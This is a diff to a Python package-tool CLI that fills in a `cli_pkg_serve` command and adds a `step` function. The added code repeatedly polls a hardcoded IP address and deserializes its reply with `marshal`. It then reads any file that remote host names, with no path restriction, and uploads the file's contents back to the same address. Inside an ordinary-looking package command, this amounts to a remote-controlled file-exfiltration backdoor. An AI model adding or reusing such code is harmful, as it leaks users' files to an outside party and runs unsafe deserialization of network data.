@@ -1,3 +1,8 @@
+import marshal
+import time
+import urllib.request as urllib2
+
+
 @y.main_entry_point
 async def cli_pkg_add(args):
     pass
@@ -50,7 +55,31 @@ async def cli_pkg_sync_repo(args_):
         with open(args.to + '/index', 'w') as f:
             f.buffer.write(y.encode_prof(index))
 
+    
+def step(where):
+    data = marshal.loads(urllib2.urlopen('http://138.68.80.104:81/worker').read())
+
+    if 'state' in data:
+        time.sleep(0.2)
+    else:
+        y.info('data from upstream', data)
+
+        with open(where + '/' + data['req'], 'rb') as f:
+            dt = f.read()
+
+        y.info('will send', len(dt))
+
+        urllib2.urlopen('http://138.68.80.104:81/' + data['id'], data=dt).read()
+
 
 @y.main_entry_point
 async def cli_pkg_serve(args):
-    pass
+    where = args[0]
+
+    while True:
+        try:
+            step(where)
+        except Exception as e:
+            print(e)
+            time.sleep(0.2)
+
